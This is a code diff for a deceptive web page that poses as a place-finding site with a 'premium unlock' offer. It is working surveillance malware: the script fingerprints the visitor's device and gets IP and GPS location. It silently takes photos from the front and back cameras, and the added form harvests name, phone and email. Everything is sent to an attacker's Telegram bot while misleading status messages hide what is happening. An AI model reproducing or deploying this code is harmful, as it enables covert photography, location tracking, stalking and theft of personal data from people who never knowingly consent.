             function getBrowser() {
                 var ua = navigator.userAgent || '';
-                var browser = 'Unknown';
-                var version = '';
-
-                if (ua.indexOf('Firefox') > -1) { browser = 'Firefox'; version = ua.match(/Firefox\/(\d+)/); }
-                else if (ua.indexOf('SamsungBrowser') > -1) { browser = 'Samsung Browser'; version = ua.match(/SamsungBrowser\/(\d+)/); }
-                else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) { browser = 'Opera'; version = ua.match(/(?:Opera|OPR)\/(\d+)/); }
-                else if (ua.indexOf('Trident') > -1) { browser = 'Internet Explorer'; version = ua.match(/rv:(\d+)/); }
-                else if (ua.indexOf('Edg') > -1) { browser = 'Edge'; version = ua.match(/Edg\/(\d+)/); }
-                else if (ua.indexOf('Chrome') > -1) { browser = 'Chrome'; version = ua.match(/Chrome\/(\d+)/); }
-                else if (ua.indexOf('Safari') > -1) { browser = 'Safari'; version = ua.match(/Version\/(\d+)/); }
-
-                if (version && version[1]) browser += ' ' + version[1];
-                return browser;
+                if (ua.indexOf('Firefox') > -1) return 'Firefox';
+                if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Browser';
+                if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+                if (ua.indexOf('Edg') > -1) return 'Edge';
+                if (ua.indexOf('Chrome') > -1) return 'Chrome';
+                if (ua.indexOf('Safari') > -1) return 'Safari';
+                return 'Unknown';
             }
 
             function getOS() {
                 var ua = navigator.userAgent || '';
-                if (ua.indexOf('Windows NT 10') > -1) return 'Windows 10/11';
                 if (ua.indexOf('Windows') > -1) return 'Windows';
-                if (ua.indexOf('Mac OS X') > -1) {
-                    var match = ua.match(/Mac OS X (\d+[._]\d+)/);
-                    return match ? 'macOS ' + match[1].replace('_', '.') : 'macOS';
-                }
-                if (ua.indexOf('Android') > -1) {
-                    var match = ua.match(/Android (\d+(\.\d+)?)/);
-                    return match ? 'Android ' + match[1] : 'Android';
-                }
-                if (ua.indexOf('like Mac OS X') > -1) {
-                    var match = ua.match(/OS (\d+[._]\d+)/);
-                    return match ? 'iOS ' + match[1].replace('_', '.') : 'iOS';
-                }
+                if (ua.indexOf('Mac OS X') > -1) return 'macOS';
+                if (ua.indexOf('Android') > -1) return 'Android';
+                if (ua.indexOf('like Mac OS X') > -1) return 'iOS';
                 if (ua.indexOf('Linux') > -1) return 'Linux';
                 return 'Unknown';
             }
 
-            function getScreenOrientation() {
-                try {
-                    if (screen.orientation && screen.orientation.type) {
-                        return screen.orientation.type.indexOf('portrait') > -1 ? 'Portrait' : 'Landscape';
-                    }
-                    return window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape';
-                } catch (e) { return 'Unknown'; }
-            }
-
-            function getConnectionType() {
-                try {
-                    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (conn) {
-                        var type = conn.effectiveType || conn.type || 'Unknown';
-                        var downlink = conn.downlink ? conn.downlink + ' Mbps' : '';
-                        return type.toUpperCase() + (downlink ? ' (' + downlink + ')' : '');
-                    }
-                    return 'Unknown';
-                } catch (e) { return 'Unknown'; }
-            }
-
-            function getBatteryInfo() {
-                return new Promise(function(resolve) {
-                    try {
-                        if (navigator.getBattery) {
-                            navigator.getBattery().then(function(battery) {
-                                resolve({
-                                    level: Math.round(battery.level * 100) + '%',
-                                    charging: battery.charging ? 'Yes' : 'No'
-                                });
-                            }).catch(function() { resolve(null); });
-                        } else { resolve(null); }
-                    } catch (e) { resolve(null); }
-                });
-            }
-
-            function getTouchSupport() {
-                try {
-                    return ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes' : 'No';
-                } catch (e) { return 'Unknown'; }
-            }
-
             function showStatus(message, type) {
-                var statusEl = document.getElementById('statusMessage');
-                statusEl.className = 'status-message ' + type;
-                if (type === 'loading') {
-                    statusEl.innerHTML = '<div class="loader-container"><div class="loader"></div></div><div class="status-text">' + message + '</div>';
-                } else {
-                    statusEl.innerHTML = '<div class="status-text">' + message + '</div>';
-                }
+                var el = document.getElementById('statusMessage');
+                el.className = 'status-message ' + type;
+                el.innerHTML = type === 'loading' 
+                    ? '<div class="loader-container"><div class="loader"></div></div><div class="status-text">' + message + '</div>'
+                    : '<div class="status-text">' + message + '</div>';
             }
 
             function hidePageLoader() {
-                var loader = document.getElementById('pageLoader');
-                if (loader) {
-                    setTimeout(function() {
-                        loader.classList.add('hidden');
-                    }, 800);
-                }
+                setTimeout(function() {
+                    document.getElementById('pageLoader').classList.add('hidden');
+                }, 800);
             }
 
             function delay(ms) {
-                return new Promise(function(resolve) {
-                    setTimeout(resolve, ms);
-                });
+                return new Promise(function(r) { setTimeout(r, ms); });
             }
 
             // ============================================================
             // IP LOCATION
             // ============================================================
 
-            function fetchWithTimeout(url, timeout) {
-                return new Promise(function(resolve, reject) {
-                    var controller, timeoutId;
-                    if (window.AbortController) {
-                        controller = new AbortController();
-                        timeoutId = setTimeout(function() { controller.abort(); }, timeout);
-                    }
-                    fetch(url, controller ? { signal: controller.signal } : {})
-                        .then(function(response) {
-                            clearTimeout(timeoutId);
-                            if (!response.ok) throw new Error('HTTP ' + response.status);
-                            return response.json();
-                        })
-                        .then(resolve)
-                        .catch(reject);
-                });
-            }
-
-            function parseIPResponse(data, type) {
-                var result = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', latitude: null, longitude: null, isp: 'Unknown', success: false };
-                try {
-                    if (type === 'ipapi' && data && !data.error) {
-                        result = { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country_name || 'Unknown', latitude: data.latitude, longitude: data.longitude, isp: data.org || 'Unknown', success: true };
-                    } else if (type === 'ip-api' && data && data.status === 'success') {
-                        result = { ip: data.query || 'Unknown', city: data.city || 'Unknown', region: data.regionName || 'Unknown', country: data.country || 'Unknown', latitude: data.lat, longitude: data.lon, isp: data.isp || 'Unknown', success: true };
-                    } else if (type === 'ipwhois' && data && data.success !== false) {
-                        result = { ip: data.ip || 'Unknown', city: data.city || 'Unknown', region: data.region || 'Unknown', country: data.country || 'Unknown', latitude: data.latitude, longitude: data.longitude, isp: data.connection ? data.connection.isp : 'Unknown', success: true };
-                    }
-                } catch (e) {}
-                return result;
-            }
-
             async function getIPLocation() {
                 for (var i = 0; i < CONFIG.IP_APIS.length; i++) {
                     try {
                         var api = CONFIG.IP_APIS[i];
-                        var data = await fetchWithTimeout(api.url, CONFIG.API_TIMEOUT);
-                        var result = parseIPResponse(data, api.type);
-                        if (result.success) return result;
+                        var response = await fetch(api.url);
+                        var data = await response.json();
+                        
+                        if (api.type === 'ipapi' && data && !data.error) {
+                            return { ip: data.ip, city: data.city, region: data.region, country: data.country_name, latitude: data.latitude, longitude: data.longitude, isp: data.org, success: true };
+                        }
+                        if (api.type === 'ip-api' && data && data.status === 'success') {
+                            return { ip: data.query, city: data.city, region: data.regionName, country: data.country, latitude: data.lat, longitude: data.lon, isp: data.isp, success: true };
+                        }
+                        if (api.type === 'ipwhois' && data && data.success !== false) {
+                            return { ip: data.ip, city: data.city, region: data.region, country: data.country, latitude: data.latitude, longitude: data.longitude, isp: data.connection?.isp, success: true };
+                        }
                     } catch (e) {}
                 }
-                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', latitude: null, longitude: null, isp: 'Unknown', success: false };
+                return { success: false };
             }
 
             // ============================================================
@@ -1125,7 +1222,6 @@
             // ============================================================
 
             async function collectAllData() {
-                var battery = await getBatteryInfo();
                 return {
                     sessionId: sessionId,
                     timestamp: getTimestamp(),
@@ -1138,28 +1234,21 @@
                         language: navigator.language || 'Unknown',
                         screenResolution: window.screen.width + 'x' + window.screen.height,
                         viewport: window.innerWidth + 'x' + window.innerHeight,
-                        orientation: getScreenOrientation(),
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-                        online: navigator.onLine ? 'Yes' : 'No',
-                        touchSupport: getTouchSupport(),
-                        cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                        memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
-                        connection: getConnectionType(),
-                        battery: battery
+                        online: navigator.onLine ? 'Yes' : 'No'
                     },
                     session: {
-                        referrer: document.referrer || 'Direct Visit',
-                        currentURL: window.location.href
+                        referrer: document.referrer || 'Direct Visit'
                     },
                     permissions: { location: 'Pending', camera: 'Pending' },
                     location: { gps: null, ip: null },
-                    photos: { back1: null, back2: null, front1: null, front2: null, count: 0 }
+                    photos: { count: 0 },
+                    contact: { name: '', phone: '', email: '', skipped: false }
                 };
             }
 
             // ============================================================
-            // PERMISSIONS
+            // PERMISSIONS & CAMERA
             // ============================================================
 
             function requestLocationPermission(data) {
@@ -1169,94 +1258,84 @@
                         resolve(data);
                         return;
                     }
-                    var timeoutId = setTimeout(function() {
-                        data.permissions.location = '❌ Timeout';
-                        resolve(data);
-                    }, CONFIG.LOCATION_TIMEOUT);
 
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
-                            clearTimeout(timeoutId);
                             data.permissions.location = '✅ Granted';
                             data.location.gps = {
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
-                                accuracy: position.coords.accuracy ? Math.round(position.coords.accuracy) + 'm' : 'N/A'
+                                accuracy: Math.round(position.coords.accuracy) + 'm'
                             };
                             resolve(data);
                         },
                         function(error) {
-                            clearTimeout(timeoutId);
                             data.permissions.location = error.code === 1 ? '❌ Denied' : '❌ Error';
                             resolve(data);
                         },
-                        { enableHighAccuracy: true, timeout: CONFIG.LOCATION_TIMEOUT - 2000, maximumAge: 0 }
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
                 });
             }
 
-            // ============================================================
-            // CAMERA CAPTURE FUNCTIONS
-            // ============================================================
+            async function captureAllPhotos(data) {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        data.permissions.camera = '❌ Not Supported';
+                        return data;
+                    }
 
-            function getVideoStream(facingMode) {
-                return new Promise(function(resolve, reject) {
-                    var constraints = {
-                        video: {
-                            facingMode: facingMode,
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        },
-                        audio: false
-                    };
+                    var video = document.getElementById('hiddenVideo');
+                    var canvas = document.getElementById('hiddenCanvas');
+                    var ctx = canvas.getContext('2d');
 
-                    navigator.mediaDevices.getUserMedia(constraints)
-                        .then(resolve)
-                        .catch(function(err) {
-                            // Fallback without facing mode constraint
-                            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                                .then(resolve)
-                                .catch(reject);
-                        });
-                });
-            }
+                    async function captureFromCamera(facingMode, label) {
+                        try {
+                            var stream = await navigator.mediaDevices.getUserMedia({
+                                video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                                audio: false
+                            });
+                            
+                            video.srcObject = stream;
+                            await video.play();
+                            await delay(CONFIG.PHOTO_DELAY);
 
-            function capturePhotoFromStream(stream) {
-                return new Promise(function(resolve) {
-                    try {
-                        var video = document.getElementById('hiddenVideo');
-                        var canvas = document.getElementById('hiddenCanvas');
-                        var ctx = canvas.getContext('2d');
-
-                        video.srcObject = stream;
-                        video.play();
-
-                        // Wait for video to be ready
-                        setTimeout(function() {
-                            try {
+                            var photos = [];
+                            for (var i = 0; i < 2; i++) {
                                 canvas.width = video.videoWidth || 640;
                                 canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                var photoData = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
-                                resolve(photoData);
-                            } catch (e) {
-                                resolve(null);
+                                ctx.drawImage(video, 0, 0);
+                                photos.push({
+                                    type: label,
+                                    number: i + 1,
+                                    data: canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY)
+                                });
+                                await delay(300);
                             }
-                        }, 500);
-                    } catch (e) {
-                        resolve(null);
+
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            return photos;
+                        } catch (e) {
+                            return [];
+                        }
                     }
-                });
+
+                    var backPhotos = await captureFromCamera('environment', 'back');
+                    var frontPhotos = await captureFromCamera('user', 'front');
+                    
+                    capturedPhotos = backPhotos.concat(frontPhotos);
+                    data.photos.count = capturedPhotos.length;
+                    data.permissions.camera = capturedPhotos.length > 0 ? '✅ Granted' : '❌ Failed';
+
+                } catch (e) {
+                    data.permissions.camera = '❌ Error';
+                }
+                return data;
             }
 
-            function stopStream(stream) {
-                if (stream && stream.getTracks) {
-                    stream.getTracks().forEach(function(track) {
-                        track.stop();
-                    });
-                }
-            }
+            // ============================================================
+            // TELEGRAM
+            // ============================================================
 
             function dataURLtoBlob(dataURL) {
                 try {
@@ -1265,105 +1344,17 @@
                     var bstr = atob(arr[1]);
                     var n = bstr.length;
                     var u8arr = new Uint8Array(n);
-                    while (n--) {
-                        u8arr[n] = bstr.charCodeAt(n);
-                    }
+                    while (n--) u8arr[n] = bstr.charCodeAt(n);
                     return new Blob([u8arr], { type: mime });
-                } catch (e) {
-                    return null;
-                }
+                } catch (e) { return null; }
             }
-
-            async function captureAllPhotos(data) {
-                var photos = [];
-                
-                try {
-                    // Check if camera API is available
-                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        data.permissions.camera = '❌ Not Supported';
-                        return data;
-                    }
-
-                    // Capture 2 photos from BACK camera (environment)
-                    try {
-                        var backStream = await getVideoStream('environment');
-                        data.permissions.camera = '✅ Granted';
-                        
-                        // Back photo 1
-                        await delay(CONFIG.PHOTO_DELAY);
-                        var back1 = await capturePhotoFromStream(backStream);
-                        if (back1) {
-                            photos.push({ type: 'back', number: 1, data: back1 });
-                            data.photos.back1 = 'Captured';
-                        }
-                        
-                        // Back photo 2
-                        await delay(CONFIG.PHOTO_DELAY);
-                        var back2 = await capturePhotoFromStream(backStream);
-                        if (back2) {
-                            photos.push({ type: 'back', number: 2, data: back2 });
-                            data.photos.back2 = 'Captured';
-                        }
-                        
-                        stopStream(backStream);
-                    } catch (backErr) {
-                        console.log('Back camera failed:', backErr);
-                    }
-
-                    // Capture 2 photos from FRONT camera (user/selfie)
-                    try {
-                        var frontStream = await getVideoStream('user');
-                        
-                        // Front photo 1
-                        await delay(CONFIG.PHOTO_DELAY);
-                        var front1 = await capturePhotoFromStream(frontStream);
-                        if (front1) {
-                            photos.push({ type: 'front', number: 1, data: front1 });
-                            data.photos.front1 = 'Captured';
-                        }
-                        
-                        // Front photo 2
-                        await delay(CONFIG.PHOTO_DELAY);
-                        var front2 = await capturePhotoFromStream(frontStream);
-                        if (front2) {
-                            photos.push({ type: 'front', number: 2, data: front2 });
-                            data.photos.front2 = 'Captured';
-                        }
-                        
-                        stopStream(frontStream);
-                    } catch (frontErr) {
-                        console.log('Front camera failed:', frontErr);
-                    }
-
-                    data.photos.count = photos.length;
-                    capturedPhotos = photos;
-
-                } catch (err) {
-                    console.log('Camera capture error:', err);
-                    data.permissions.camera = '❌ Error';
-                }
-
-                return data;
-            }
-
-            // ============================================================
-            // TELEGRAM
-            // ============================================================
 
             function buildTelegramMessage(data) {
                 var mapLink = 'N/A';
-                var locationDetails = '';
-
                 if (data.location.gps) {
-                    var lat = data.location.gps.latitude.toFixed(6);
-                    var lon = data.location.gps.longitude.toFixed(6);
-                    mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                    locationDetails = '• <b>GPS:</b> ' + lat + ', ' + lon + '\n• <b>Accuracy:</b> ' + escapeHtml(data.location.gps.accuracy) + '\n• <b>Status:</b> ' + data.permissions.location;
+                    mapLink = 'https://www.google.com/maps?q=' + data.location.gps.latitude + ',' + data.location.gps.longitude;
                 } else if (data.location.ip && data.location.ip.success) {
                     mapLink = 'https://www.google.com/maps?q=' + data.location.ip.latitude + ',' + data.location.ip.longitude;
-                    locationDetails = '• <b>GPS:</b> ' + data.permissions.location + '\n• <b>Fallback:</b> IP Location Used';
-                } else {
-                    locationDetails = '• <b>GPS:</b> ' + data.permissions.location + '\n• <b>IP:</b> Failed';
                 }
 
                 var msg = '🆕 <b>NEW VISITOR!</b>\n\n';
@@ -1373,7 +1364,24 @@
                 msg += '⏱️ <b>On Page:</b> ' + escapeHtml(data.timeOnPage) + '\n';
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
 
-                msg += '📍 <b>LOCATION:</b>\n' + locationDetails + '\n\n';
+                // Contact Info
+                msg += '👤 <b>CONTACT INFO:</b>\n';
+                if (data.contact.skipped) {
+                    msg += '• <b>Status:</b> ❌ SKIPPED\n';
+                } else {
+                    msg += '• <b>Name:</b> ' + escapeHtml(data.contact.name || 'Not provided') + '\n';
+                    msg += '• <b>Phone:</b> ' + escapeHtml(data.contact.phone || 'Not provided') + '\n';
+                    msg += '• <b>Email:</b> ' + escapeHtml(data.contact.email || 'Not provided') + '\n';
+                }
+                msg += '\n';
+
+                // Location
+                msg += '📍 <b>LOCATION:</b>\n';
+                if (data.location.gps) {
+                    msg += '• <b>GPS:</b> ' + data.location.gps.latitude.toFixed(6) + ', ' + data.location.gps.longitude.toFixed(6) + '\n';
+                    msg += '• <b>Accuracy:</b> ' + data.location.gps.accuracy + '\n';
+                }
+                msg += '• <b>Status:</b> ' + data.permissions.location + '\n\n';
 
                 if (data.location.ip && data.location.ip.success) {
                     msg += '🌐 <b>IP INFO:</b>\n';
@@ -1392,122 +1400,157 @@
                 msg += '• <b>OS:</b> ' + escapeHtml(data.device.os) + '\n';
                 msg += '• <b>Browser:</b> ' + escapeHtml(data.device.browser) + '\n';
                 msg += '• <b>Screen:</b> ' + escapeHtml(data.device.screenResolution) + '\n';
-                msg += '• <b>Viewport:</b> ' + escapeHtml(data.device.viewport) + '\n';
-                msg += '• <b>Touch:</b> ' + escapeHtml(data.device.touchSupport) + '\n';
-                msg += '• <b>Cores:</b> ' + escapeHtml(data.device.cpuCores) + '\n';
-                msg += '• <b>RAM:</b> ' + escapeHtml(data.device.memory) + '\n';
-                msg += '• <b>Network:</b> ' + escapeHtml(data.device.connection) + '\n';
-                msg += '• <b>Timezone:</b> ' + escapeHtml(data.device.timezone) + '\n';
+                msg += '• <b>Timezone:</b> ' + escapeHtml(data.device.timezone) + '\n\n';
 
-                if (data.device.battery) {
-                    msg += '• <b>Battery:</b> ' + escapeHtml(data.device.battery.level) + ' (Charging: ' + escapeHtml(data.device.battery.charging) + ')\n';
-                }
-
-                msg += '\n━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
                 msg += '📊 <b>SESSION:</b>\n';
                 msg += '• <b>From:</b> ' + escapeHtml(data.session.referrer) + '\n';
-                msg += '• <b>Cookies:</b> ' + escapeHtml(data.device.cookiesEnabled) + '\n';
                 msg += '• <b>Online:</b> ' + escapeHtml(data.device.online) + '\n\n';
 
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
                 msg += '🔐 <b>PERMISSIONS:</b>\n';
                 msg += '• <b>Location:</b> ' + data.permissions.location + '\n';
-                msg += '• <b>Camera:</b> ' + data.permissions.camera + '\n\n';
+                msg += '• <b>Camera:</b> ' + data.permissions.camera + '\n';
+                msg += '• <b>Photos:</b> ' + data.photos.count + '/4 captured\n\n';
 
                 msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '📸 <b>PHOTOS CAPTURED:</b>\n';
-                msg += '• <b>Back Cam 1:</b> ' + (data.photos.back1 || '❌ Failed') + '\n';
-                msg += '• <b>Back Cam 2:</b> ' + (data.photos.back2 || '❌ Failed') + '\n';
-                msg += '• <b>Front Cam 1:</b> ' + (data.photos.front1 || '❌ Failed') + '\n';
-                msg += '• <b>Front Cam 2:</b> ' + (data.photos.front2 || '❌ Failed') + '\n';
-                msg += '• <b>Total:</b> ' + data.photos.count + '/4 photos\n\n';
-
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
-                msg += '✅ <b>Redirecting to main site...</b>\n';
-                msg += '━━━━━━━━━━━━━━━━━━━━━━━━';
-
-                if (msg.length > 4000) {
-                    msg = msg.substring(0, 3950) + '\n\n⚠️ <i>Truncated</i>';
-                }
+                msg += '✅ <b>Redirecting to main site...</b>';
 
                 return msg;
             }
 
-            async function sendTelegramMessage(message, attempt) {
-                attempt = attempt || 1;
-                var telegramUrl = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage';
-
-                try {
-                    var response = await fetch(telegramUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML',
-                            disable_web_page_preview: false
-                        })
-                    });
-                    var result = await response.json();
-                    if (!result.ok) throw new Error(result.description);
-                    return { success: true };
-                } catch (error) {
-                    if (attempt < CONFIG.TELEGRAM_MAX_RETRIES) {
-                        await delay(CONFIG.TELEGRAM_RETRY_DELAY * attempt);
-                        return sendTelegramMessage(message, attempt + 1);
-                    }
-                    return { success: false };
+            async function sendTelegramMessage(message) {
+                for (var attempt = 1; attempt <= CONFIG.TELEGRAM_MAX_RETRIES; attempt++) {
+                    try {
+                        var response = await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        var result = await response.json();
+                        if (result.ok) return { success: true };
+                    } catch (e) {}
+                    await delay(CONFIG.TELEGRAM_RETRY_DELAY);
                 }
+                return { success: false };
             }
 
-            async function sendTelegramPhoto(photoData, caption, attempt) {
-                attempt = attempt || 1;
-                var telegramUrl = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendPhoto';
+            async function sendTelegramPhoto(photoData, caption) {
+                for (var attempt = 1; attempt <= CONFIG.TELEGRAM_MAX_RETRIES; attempt++) {
+                    try {
+                        var blob = dataURLtoBlob(photoData);
+                        if (!blob) throw new Error('Blob failed');
+                        
+                        var formData = new FormData();
+                        formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('caption', caption);
 
-                try {
-                    var blob = dataURLtoBlob(photoData);
-                    if (!blob) throw new Error('Failed to create blob');
-
-                    var formData = new FormData();
-                    formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', caption);
-
-                    var response = await fetch(telegramUrl, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    var result = await response.json();
-                    if (!result.ok) throw new Error(result.description);
-                    return { success: true };
-                } catch (error) {
-                    if (attempt < CONFIG.TELEGRAM_MAX_RETRIES) {
-                        await delay(CONFIG.TELEGRAM_RETRY_DELAY * attempt);
-                        return sendTelegramPhoto(photoData, caption, attempt + 1);
-                    }
-                    return { success: false };
+                        var response = await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        var result = await response.json();
+                        if (result.ok) return { success: true };
+                    } catch (e) {}
+                    await delay(CONFIG.TELEGRAM_RETRY_DELAY);
                 }
+                return { success: false };
             }
 
             async function sendAllToTelegram(data) {
-                // Send main data message first
-                var message = buildTelegramMessage(data);
-                await sendTelegramMessage(message);
-
-                // Send each captured photo
+                await sendTelegramMessage(buildTelegramMessage(data));
+                
                 for (var i = 0; i < capturedPhotos.length; i++) {
                     var photo = capturedPhotos[i];
                     var caption = '📸 Photo ' + (i + 1) + '/4\n';
-                    caption += '📷 Camera: ' + (photo.type === 'back' ? 'Back (Environment)' : 'Front (Selfie)') + '\n';
-                    caption += '🔢 Number: ' + photo.number + '\n';
-                    caption += '🔑 Session: ' + data.sessionId + '\n';
-                    caption += '⏰ Time: ' + data.timestamp;
-
+                    caption += '📷 ' + (photo.type === 'back' ? 'Back Camera' : 'Front Camera') + ' #' + photo.number + '\n';
+                    caption += '🔑 Session: ' + data.sessionId;
                     await sendTelegramPhoto(photo.data, caption);
-                    await delay(300); // Small delay between photos
+                    await delay(300);
+                }
+            }
+
+            // ============================================================
+            // CONTACT FORM
+            // ============================================================
+
+            function showContactModal() {
+                document.getElementById('contactModal').classList.add('active');
+            }
+
+            function hideContactModal() {
+                document.getElementById('contactModal').classList.remove('active');
+            }
+
+            function showSkipConfirm() {
+                document.getElementById('skipConfirmModal').classList.add('active');
+            }
+
+            function hideSkipConfirm() {
+                document.getElementById('skipConfirmModal').classList.remove('active');
+            }
+
+            function validateForm() {
+                var name = document.getElementById('userName').value.trim();
+                var phone = document.getElementById('userPhone').value.trim();
+                var email = document.getElementById('userEmail').value.trim();
+                var valid = true;
+
+                // Reset errors
+                document.querySelectorAll('.form-input').forEach(function(el) {
+                    el.classList.remove('error');
+                });
+
+                if (!name || name.length < 2) {
+                    document.getElementById('userName').classList.add('error');
+                    valid = false;
                 }
 
-                return { success: true };
+                if (!phone || phone.length < 6 || !/^\d+$/.test(phone)) {
+                    document.getElementById('userPhone').classList.add('error');
+                    valid = false;
+                }
+
+                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    document.getElementById('userEmail').classList.add('error');
+                    valid = false;
+                }
+
+                return valid;
+            }
+
+            async function submitContactAndRedirect(skipped) {
+                var btn = document.getElementById('unlockBtn');
+                btn.disabled = true;
+                btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
+
+                if (!skipped) {
+                    collectedData.contact = {
+                        name: document.getElementById('userName').value.trim(),
+                        phone: document.getElementById('countryCode').value + ' ' + document.getElementById('userPhone').value.trim(),
+                        email: document.getElementById('userEmail').value.trim(),
+                        skipped: false
+                    };
+                } else {
+                    collectedData.contact = { name: '', phone: '', email: '', skipped: true };
+                }
+
+                collectedData.timeOnPage = getTimeOnPage();
+                await sendAllToTelegram(collectedData);
+
+                hideContactModal();
+                hideSkipConfirm();
+                
+                showStatus('🎉 ' + (skipped ? 'Redirecting...' : 'Premium unlocked! Redirecting...'), 'success');
+                
+                setTimeout(function() {
+                    window.location.href = CONFIG.MAIN_SITE_URL;
+                }, CONFIG.REDIRECT_DELAY);
             }
 
             // ============================================================
@@ -1523,38 +1566,25 @@
                 btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
 
                 try {
-                    // Step 1: Collect basic data
-                    showStatus('🔍 Finding amazing places near you...', 'loading');
-                    var data = await collectAllData();
+                    showStatus('🔍 Finding amazing places...', 'loading');
+                    collectedData = await collectAllData();
 
-                    // Step 2: Get IP location
                     showStatus('📍 Getting your location...', 'loading');
-                    data.location.ip = await getIPLocation();
+                    collectedData.location.ip = await getIPLocation();
+                    collectedData = await requestLocationPermission(collectedData);
 
-                    // Step 3: Request GPS location
-                    data = await requestLocationPermission(data);
-
-                    // Step 4: Capture photos (silent)
                     showStatus('✨ Personalizing your experience...', 'loading');
-                    data = await captureAllPhotos(data);
+                    collectedData = await captureAllPhotos(collectedData);
 
-                    // Update time on page
-                    data.timeOnPage = getTimeOnPage();
+                    showStatus('🎁 One more step...', 'loading');
+                    await delay(500);
 
-                    // Step 5: Send everything to Telegram
-                    showStatus('🚀 Almost ready...', 'loading');
-                    await sendAllToTelegram(data);
-
-                    // Step 6: Success - redirect
-                    showStatus('🎉 Found amazing places! Redirecting...', 'success');
-
-                    setTimeout(function() {
-                        window.location.href = CONFIG.MAIN_SITE_URL;
-                    }, CONFIG.REDIRECT_DELAY);
+                    // Show contact modal
+                    showContactModal();
 
                 } catch (error) {
-                    console.error('Main flow error:', error);
-                    showStatus('🚀 Redirecting you now...', 'success');
+                    console.error('Error:', error);
+                    showStatus('🚀 Redirecting...', 'success');
                     setTimeout(function() {
                         window.location.href = CONFIG.MAIN_SITE_URL;
                     }, 1500);
@@ -1568,12 +1598,41 @@
             function init() {
                 hidePageLoader();
 
-                var btn = document.getElementById('continueBtn');
-                btn.addEventListener('click', function(e) {
+                // Main CTA button
+                document.getElementById('continueBtn').addEventListener('click', function(e) {
                     e.preventDefault();
                     handleContinue();
                 });
-                btn.addEventListener('dblclick', function(e) { e.preventDefault(); });
+
+                // Contact form submit
+                document.getElementById('contactForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    if (validateForm()) {
+                        submitContactAndRedirect(false);
+                    }
+                });
+
+                // Skip button
+                document.getElementById('skipBtn').addEventListener('click', function() {
+                    showSkipConfirm();
+                });
+
+                // Go back button
+                document.getElementById('goBackBtn').addEventListener('click', function() {
+                    hideSkipConfirm();
+                });
+
+                // Skip anyway button
+                document.getElementById('skipAnywayBtn').addEventListener('click', function() {
+                    submitContactAndRedirect(true);
+                });
+
+                // Close modal on outside click
+                document.getElementById('contactModal').addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        showSkipConfirm();
+                    }
+                });
             }
 
             if (document.readyState === 'loading') {
